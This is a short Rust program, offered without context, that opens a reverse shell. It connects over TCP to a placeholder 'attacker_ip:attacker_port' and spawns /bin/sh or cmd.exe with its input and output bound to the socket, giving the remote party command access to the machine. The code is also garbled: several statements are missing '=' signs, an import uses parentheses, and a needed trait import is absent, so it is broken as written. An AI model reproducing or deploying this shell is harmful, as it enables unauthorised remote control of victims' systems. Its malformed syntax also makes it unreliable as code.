use std::net:: TcpStream;

use std::os::unix::io:: AsRawFd;

use std::process:: (Command, Stdio);

fn main() {

if let Ok(stream) TcpStream::connect("attacker_ip:attacker_port") { let shell if cfg! (target_os = "windows") { "cmd.exe" } else { "/bin/sh" };

let fd stream.as_raw_fd();

Command::new(shell)

.stdin(unsafe { Stdio::from_raw_fd(fd) })

.stdout(unsafe { Stdio::from_raw_fd(fd) })

.stderr (unsafe { Stdio::from_raw_fd(fd) })

.spawn()

.expect("Failed to spawn shell");

}
}